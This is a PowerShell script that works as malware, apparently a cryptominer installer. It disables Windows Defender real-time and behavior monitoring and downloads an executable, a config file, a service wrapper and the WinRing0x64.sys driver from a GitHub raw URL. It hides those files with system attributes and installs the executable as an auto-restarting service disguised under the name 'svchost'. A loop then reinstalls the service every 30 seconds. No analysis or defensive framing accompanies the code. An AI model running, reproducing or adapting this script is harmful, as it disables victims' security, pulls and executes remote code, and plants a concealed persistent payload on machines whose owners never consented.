param()
$TargetFolder = "C:\Users\user\Desktop\SystemData"
$ExePath = Join-Path $TargetFolder "svchost.exe"
$GnssmPath = Join-Path $TargetFolder "gnssm.exe"
$ServiceName = "svchost"

function Disable-Security {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
}

function Download-Files {
    $files = @("svchost.exe","config.json","gnssm.exe","WinRing0x64.sys")
    foreach($f in $files){
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/HeySinker/bsbs/main/$f" `
            -OutFile (Join-Path $TargetFolder $f) -UseBasicParsing -ErrorAction SilentlyContinue
        cmd /c "attrib +h +s +r `"$TargetFolder\$f`"" | Out-Null
    }
}

function Install-Service {
    param($ExePath,$ServiceName,$GnssmPath)
    & $GnssmPath remove $ServiceName confirm | Out-Null
    & $GnssmPath install $ServiceName $ExePath
    & $GnssmPath set $ServiceName AppExit Default Restart
    & $GnssmPath set $ServiceName AppRestartDelay 30000
    & $GnssmPath set $ServiceName Start SERVICE_AUTO_START
    Start-Service $ServiceName -ErrorAction SilentlyContinue
}

while($true){
    if(!(Test-Path $ExePath)){ 
        Disable-Security
        Download-Files
    }
    $svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if(!$svc -or $svc.Status -ne "Running"){
        Install-Service $ExePath $ServiceName $GnssmPath
    }
    Start-Sleep -Seconds 30
}
